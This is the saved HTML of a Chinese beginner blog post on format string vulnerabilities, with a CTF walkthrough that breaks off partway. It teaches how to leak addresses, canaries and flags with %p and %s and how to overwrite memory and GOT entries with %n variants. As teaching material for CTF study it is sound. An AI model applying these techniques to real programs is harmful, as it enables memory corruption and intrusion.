@@ -1,0 +1,916 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    格式化字符串漏洞 |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="格式化字符串漏洞(萌新向)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="https://fallingdusky.github.io/2023/11/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="格式化字符串漏洞(萌新向)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231126225758447-1428256810.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231126230052650-478950979.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130154749946-1393197928.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127172552570-1793733024.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127212936954-1650703827.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127213145702-2069885253.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130151246289-900442741.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200059649-1724979617.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200337584-587620049.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200902629-570334284.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201152082-1056185645.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201346914-112111018.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202312/3326078-20231201094821051-1803334501.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201611299-2055057684.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130202424510-1409818700.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130202702867-971226393.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130203732746-999822084.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130204416608-1439661651.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205209165-483184888.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205345361-1218213793.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205347227-19446162.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130210841861-887187303.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130210846052-558394008.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130213404122-894260468.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130214618369-293825995.png">
+<meta property="article:published_time" content="2023-11-30T13:54:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:04:36.203Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231126225758447-1428256810.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="格式化字符串漏洞">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">格式化字符串漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-格式化字符串漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2023/11/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2023-11-30T13:54:00.000Z" itemprop="datePublished">2023-11-30</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-aos="zoom-in">网络安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <p>怎么说呢，这个东西感觉相当不好写，涉及到的知识点很多，不一定能讲明白，我自己写的话只能尽量往基础的知识点上写了，若有不准确之处，希望佬们能及时指出，让我加以修改。</p>
+<h1 id="格式化字符串漏洞"><a class="markdownIt-Anchor" href="#格式化字符串漏洞"></a> 格式化字符串漏洞</h1>
+<h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2>
+<p>格式化字符串漏洞的形成原因在于printf/fprintf/vsprintf等<strong>格式化字符串打印函数在接受可变参数</strong>时，因码农自己偷懒写，<strong>编写的形式不正确而形成的漏洞</strong>。当然，这是比较诙谐的说法。<br />
+真正形成的原因是，当初创建printf函数的这批人没有让printf去检测<strong>格式化字符串的占位符个数与参数个数是否相等</strong>。只要在执行printf时，每读取到一个占位符，就会<strong>到相应的地址里获取数据</strong>并<strong>根据占位符的类型进行解码输出</strong>。所以即使你没有参数，它也是可以进行输出的<br />
+举个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="literal">true</span>[<span class="number">0x100</span>]</span><br><span class="line">规范写法：<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="literal">true</span>)</span><br><span class="line">懒人：<span class="built_in">printf</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+<p>这个时候就产生了格式化字符串漏洞。<br />
+更<strong>直观</strong>的来个代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> a = <span class="number">233</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;a=%d&quot;</span>,a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>理所当然，最终打印出a=233<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231126225758447-1428256810.png" alt="image" /><br />
+那如果我们这样呢？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> a = <span class="number">233</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;a=%d&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么就会出现一个很抽象的结果，至于为什么是负数，这就与补码有关了，只要知道这是个很大的数字，没记错的话，在十六进制里，这个数字是0xf开头，要么是动态链接库的地址，要么是栈的地址</p>
+<blockquote>
+<p>与补码有关知识链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zk_lar/article/details/125072002">https://blog.csdn.net/zk_lar/article/details/125072002</a></p>
+</blockquote>
+<p><img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231126230052650-478950979.png" alt="image" /><br />
+既然我们可以在没有参数的情况下读取到占位符里边的数据，那么我们就可以利用这一点来<strong>泄露某一函数的地址，canary的值甚至直接获得flag</strong></p>
+<h2 id="格式化字符串"><a class="markdownIt-Anchor" href="#格式化字符串"></a> 格式化字符串</h2>
+<p>在写这个之前先叠个甲，因为这个是针对<strong>初学者</strong>的（包括博主自己也是初学者），所以有些概念可能会被简化甚至是忽略（因为初期确实不常用），主要写的都是在早期时常常用到的。若有不正之处，还希望能够多多包涵。</p>
+<h3 id="基本格式"><a class="markdownIt-Anchor" href="#基本格式"></a> 基本格式</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
+<p>我们需要<strong>关注</strong>的是</p>
+<h4 id="parameter"><a class="markdownIt-Anchor" href="#parameter"></a> parameter</h4>
+<pre><code> n$，获取格式化字符串中的指定参数，比如%6$p表示从当前地址数起，获取往后偏移第6个字节长度的地址，类似于&quot;%p%p%p%p%p%p&quot;，但是前五个&quot;%p&quot;不会生效
+ 但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7$n
+ 如图所示
+</code></pre>
+<p><img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130154749946-1393197928.png" alt="image" /></p>
+<h4 id="length"><a class="markdownIt-Anchor" href="#length"></a> length</h4>
+<p>h输出2字节<br />
+hh输出1字节</p>
+<h4 id="field-width"><a class="markdownIt-Anchor" href="#field-width"></a> field width</h4>
+<p>输出的最小宽度</p>
+<h4 id="type格式化字符串占位符类型"><a class="markdownIt-Anchor" href="#type格式化字符串占位符类型"></a> type(格式化字符串占位符类型)</h4>
+<h5 id="di"><a class="markdownIt-Anchor" href="#di"></a> %d/%i</h5>
+<p>输出有符号的十进制整数。</p>
+<h5 id="u"><a class="markdownIt-Anchor" href="#u"></a> %u</h5>
+<p>输出无符号的十进制整数（可以默认为自然数）</p>
+<h5 id="xx"><a class="markdownIt-Anchor" href="#xx"></a> %x/%X</h5>
+<p>输出十六进制数，且输出<strong>4字节</strong>长<br />
+注：其输出的数值是<strong>不带&quot;0x&quot;开头</strong>的</p>
+<h5 id="lx"><a class="markdownIt-Anchor" href="#lx"></a> %lx</h5>
+<p>同%x，但输出的是<strong>8字节</strong>长</p>
+<h5 id="p"><a class="markdownIt-Anchor" href="#p"></a> %p</h5>
+<p>输出十六进制数据，<strong>附带&quot;0x&quot;开头</strong>，且<strong>x86下输出4字节，x64下输出8字节</strong>。<br />
+常用于泄露地址</p>
+<h6 id="xlxp的建议"><a class="markdownIt-Anchor" href="#xlxp的建议"></a> %x,%lx,%p的建议</h6>
+<p>多数情况下都<strong>建议用%p来泄露地址</strong>，既容易辨别出不同的地址（免得没有&quot;0x&quot;开头后混淆了)，又可以不用考虑位数(x86,x64)的区别。除非某些题目实在太细了，细到需要靠%nx来泄露参数，否则都建议用%p进行地址泄露。</p>
+<h5 id="s"><a class="markdownIt-Anchor" href="#s"></a> %s</h5>
+<p>输出字符串。也就是在<strong>进入对应地址之后将地址之中保存的值解析并输出出来</strong>。比如0x4040c0里有存有flag的值，则可以通过%s通过偏移计算来获取flag的值。<br />
+常用于简单的格式化字符串漏洞题中<strong>直接获取flag的值</strong>，或者是<strong>泄露某函数在got表里的真实地址</strong>，然后又可以用快乐的ret2libc手法进行攻击了<br />
+注：%s会有<strong>零截断</strong>，比如0x00402004%s，在遇到x00后后边会<strong>无法读取</strong>，造成<strong>泄露失败</strong>，所以还是得根据情况使用%s。另外，当%s读取的是<strong>非法地址</strong>（如非用户态所能进行读取的地址，也就是<strong>权限不够</strong>；或者<strong>本身地址就是错误的</strong>等等）时，<strong>程序会崩溃</strong>，所以一般情况下<strong>不用%s%s%s%s这样的形式进行数据读取</strong><br />
+且%s将会把指定地址中的数据<strong>按照字符形式(ASCII)进行输出</strong>，但是在ASCII中有一些字符是<strong>不可见字符</strong>。如果<strong>输出不可见字符的话将会被省略</strong>。那么即使程序进行输出我们也无法进行接收。如果对应地址中的数据中有<strong>至少一个可见字符</strong>，将会全部进行输出，这时我们<strong>可以进行接收</strong>,这在我们<strong>泄露libc地址</strong>的时候非常重要，若是泄露的got表<strong>不存在可见字符</strong>，那么<strong>输出就会被省略</strong>，我们就没法通过泄露got表的函数地址进而计算libc基地址</p>
+<blockquote>
+<p>第二段修改自：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/317425.html">https://www.freebuf.com/articles/system/317425.html</a></p>
+</blockquote>
+<h5 id="c"><a class="markdownIt-Anchor" href="#c"></a> %c</h5>
+<p>输出字符。比如%100c，会填充100个’\x00’字符，可用于快速覆盖<br />
+具体的展示效果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inclde<span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100ctest!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127172552570-1793733024.png" alt="image" /><br />
+常与%n搭配向特定地址写入数据（写入数据是%n的功能，%c是为了快速到达该地址，类似填充垃圾值)</p>
+<h5 id="n"><a class="markdownIt-Anchor" href="#n"></a> %n</h5>
+<p>将%n前的已成功打印出的字符个数写入指针所指向的地址内，且写入的字节大小为<strong>4字节</strong>。<br />
+比如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;test%n\n&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The number of a is %d&quot;</span>, a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>效果为往a所处的地址内写入4（t,e,s,t的字符个数为4)，近似于*a = 4这一表达式<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127212936954-1650703827.png" alt="image" /><br />
+如果缺少参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;test%n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The number of a is %d&quot;</span>, a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>则会将4写入到&quot;test%n&quot;上面一格的内存当中，而a无变化<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231127213145702-2069885253.png" alt="image" /><br />
+故%n常常用来<strong>篡改某一地址的内容</strong>，也是<strong>格式化字符串漏洞的核心攻击方式之一</strong><br />
+注：①.%n的payload构造在x86和x64的情况下是<strong>不一样</strong>的。在<strong>x86</strong>的payload中，改写got表的地址可以放在前面，因为它的地址的字节均为有效，<strong>不会被截断</strong>。而<strong>x64</strong>的payload中，由于打印出的got表地址中<strong>有效字节为6位</strong>，<strong>高位字节为‘00’</strong>，在字符串里就是<strong>终止符</strong>的意思，当调用printf输出到‘00’时，就会<strong>终止输出</strong>，造成攻击失败<br />
+②.当低字节写入的个数大于高字节的个数的时候，就应该运用补码了。<br />
+比如你在低字节已经写入了0x5678，而在该got表的got+2处想再写入0x1234，则需要写入-0x4444(-0x5678+0x1234)。<br />
+在补码下，-0x5678 = 0xa988<br />
+而-0x4444=0xa998+0x1234=0xbbbc=(0x10000 - 0x5678) + 0x1234 ，通用公式为后半部分<br />
+即 (0x10000 - 已写入低位字节的数字) + 想写入高位字节的数字</p>
+<blockquote>
+<p>摘自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Uv411j7fr/?p=13&amp;vd_source=51fe165aa505d5468e1ceabe09364ef5">https://www.bilibili.com/video/BV1Uv411j7fr/?p=13&amp;vd_source=51fe165aa505d5468e1ceabe09364ef5</a></p>
+</blockquote>
+<h6 id="1n的衍生"><a class="markdownIt-Anchor" href="#1n的衍生"></a> ①%n的衍生</h6>
+<p>1.%hn–&gt;2字节<br />
+2.%hhn–&gt;1字节<br />
+3.%ln–&gt;32位4字节，64位8字节<br />
+4.%lln–&gt;8字节</p>
+<h6 id="2n及其衍生的使用小建议"><a class="markdownIt-Anchor" href="#2n及其衍生的使用小建议"></a> ②%n及其衍生的使用小建议</h6>
+<p>在攻击的时候，原则上是<strong>能使用hhn绝不用hn，能使用hn绝不用n</strong>，这是有原因的。一是因为一个**%n<strong>传输的是</strong>int大小的字符个数**，会使printf输出大量的字符数量，<strong>可能造成程序崩溃</strong>。二是因为在输出大量的字符数量后，自己也不好接收数据，<strong>很难做到精确控制我们需要修改的地方</strong>。所以一般来说我们都是**%hhn和%hn结合使用**的，<strong>使数据更加稳定可控</strong></p>
+<p>这些基本就是利用格式化字符串漏洞的时候会用上的占位符，其中以**%p,%s.%n最为重要**，<strong>%c</strong>可以起很好的<strong>辅助</strong>作用</p>
+<h2 id="攻击手法"><a class="markdownIt-Anchor" href="#攻击手法"></a> 攻击手法</h2>
+<h3 id="1通过ida或者其它能反编译的工具寻找有格式化字符串漏洞的函数"><a class="markdownIt-Anchor" href="#1通过ida或者其它能反编译的工具寻找有格式化字符串漏洞的函数"></a> ①.通过IDA（或者其它能反编译的工具)<strong>寻找有格式化字符串漏洞的函数</strong></h3>
+<p>形如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="built_in">printf</span>(&amp;buf)</span><br><span class="line">\*or*\</span><br><span class="line"> <span class="built_in">printf</span>(buf)</span><br><span class="line"> \\其实这两个都是一个意思，只不过看你的反编译器怎么显示</span><br></pre></td></tr></table></figure>
+<h3 id="2找到漏洞函数后通过nc连接后求偏移量"><a class="markdownIt-Anchor" href="#2找到漏洞函数后通过nc连接后求偏移量"></a> ②.找到漏洞函数后，通过<strong>nc连接</strong>后，求<strong>偏移量</strong></h3>
+<p>求偏移量我们<strong>常常使用&quot;AAAA&quot;作为定位符</strong>，然后用&quot;%p-%p-%p-%p-%p…“泄露地址求取偏移量（”-“并无实际意义，只是把地址分隔开，便于数出偏移量)，因为定位符是&quot;A…”，所以当我们看到地址里有<strong>形如&quot;0x414141…&quot;或&quot;0x…4141…&quot;这样的地址</strong>时，数出第一个地址到这一个地址的个数，这就是偏移量，<strong>是我们能够控制的参数</strong>。<br />
+注:千万别数错了，我们求偏移量要求的是<strong>从格式化字符串的参数开始数起</strong>的，而不是从printf的第一个参数开始数的。以我②中为例子<br />
+“AAAA&quot;是printf的第一个参数，而第一个”%p&quot;才是我们的格式化字符串的第一个参数，如图<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130151246289-900442741.png" alt="image" /><br />
+这就是求取偏移量的方法，在这里是偏移量为6,<strong>&quot;nil&quot;其实也是个地址</strong>，它的地址是0x0，但是它是显示不出来的，所以是显示为了&quot;nil&quot;，<strong>不可忽略</strong>！</p>
+<h3 id="3因题而异"><a class="markdownIt-Anchor" href="#3因题而异"></a> ③.因题而异</h3>
+<p>其实就没什么别的手法了，上面两个是最通用的了，剩下的攻击手法就是看题目让你做什么了，常见的有<strong>泄露canary值(%s)，泄露libc地址(%p)或者覆盖内存(%n)</strong>，没有个固定套路。</p>
+<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
+<h3 id="1hnctf-2022-week1fmtstrres的基础应用"><a class="markdownIt-Anchor" href="#1hnctf-2022-week1fmtstrres的基础应用"></a> ①.[HNCTF 2022 Week1]fmtstrre（%s的基础应用)</h3>
+<p>首先我们checksec<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200059649-1724979617.png" alt="image" /><br />
+嗯，NX保护开启，无法往栈上堆代码，Partial RELRO的开启让部分地址随机化，没法直接使用地址，再看看IDA代码<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200337584-587620049.png" alt="image" /><br />
+可以看到，它会<strong>尝试打开一个叫做&quot;flag&quot;的文件</strong>，并且把flag里的内容输出到name的地址里边，相当于给name赋值了。如果没有&quot;flag&quot;文件，就输出&quot;Open failed&quot;。然后我们就看到printf(buf)，明显的格式化字符串漏洞，<strong>read函数可以泄露出printf里我们的可控参数</strong>，那么接下来思路就明了了，<strong>通过控制泄露出的可控参数，来打印出远端的&quot;flag&quot;内容</strong><br />
+既然题目要求我们打开&quot;flag&quot;，那我们就把ELF程序与<strong>自建的名为&quot;flag&quot;的文本</strong>放在同一个文件夹下<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130200902629-570334284.png" alt="image" /><br />
+然后，首先<strong>计算出可控参数的偏移量</strong>这里提供两种求取偏移量的方法<br />
+①.<strong>nc</strong>然后爆破<br />
